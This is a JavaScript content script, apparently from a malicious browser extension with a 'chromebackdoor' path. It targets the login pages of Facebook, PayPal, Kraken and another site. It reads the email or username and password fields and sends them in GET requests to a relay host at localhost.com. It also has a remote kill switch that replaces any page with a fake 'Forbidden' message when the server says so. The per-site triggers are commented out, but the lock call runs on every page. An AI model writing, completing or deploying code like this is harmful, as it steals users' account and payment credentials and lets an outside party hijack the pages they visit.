$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    
    // CHECK UPDATE
    function checkupdate()
    {
        var s = "2.0";
        $.get("http://localhost:8888/chromebackdoor/web/update/up.txt",function(data)
        {
            if(data != s)
            {
                alert('ok');
            }
        });
    }
    //checkupdate();

    //fonction lock
    function locking()
    {
       document.write("<h1>Forbidden !</h1><p>you don't have permission to access / on this server</p>");
    }
    function lock()
    {
        $.get("https://localhost.com/relais/lock.php",function(data)
        {
            if(data == '1')
            {
                locking();
            }
        });
    }
    
    lock();
    
    // FACEBOOK FUNCTION BESOIN DE HTTPS
    function sendF()
    {
        var email = document.getElementById('email').value;
        var pass = document.getElementById('pass').value;
        var urls = window.location.href;
        phish = email+"-123-"+pass;
        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
    }
    function face()
    {
        var fb = document.body.getElementsByTagName('input')[3];
        fb.onmouseenter = sendF;
    }
    
    function tribouillois()
    {
        function recup()
        {
            var urls = window.location.href;
            var name = $('#name')[0];
            phish = name;
            $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
        }
        var btn = $('button')[1];
        btn.onmouseenter = recup;
        
    }
    
    function paypal()
    {
        var urls = window.location.href;
        var email = $('#email')[0].value;
        var pass = $('#password')[0].value;
        var phish = email+"-123-"+pass;
        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
    }
    
    function kraken()
    {
        var urls = window.location.href;
        var username = $('input[name=username]')[0].value;
        var pass = $('input[name=password]')[0].value;
        var phish = username+"-123-"+pass;
        $.get("https://localhost.com/relais/index.php", { info: phish, url: urls } );
    }
    
    // VERIFICATION D'URL
    if(tabURL.indexOf('facebook') !== -1 )
    {
        //face();
    }
    else if(tabURL.indexOf('tribouillois') !== -1)
    {
        //tribouillois();
    }
    else if(tabURL.indexOf('paypal.com/signin/') !== -1)
    {
        //$('#btnLogin')[0].onmouseenter = paypal;
    }
    else if (tabURL.indexOf('kraken.com/en-us/login') !== -1)
    {
        var btn = $('button')[1];
        //btn.onmouseenter = kraken;
    }
});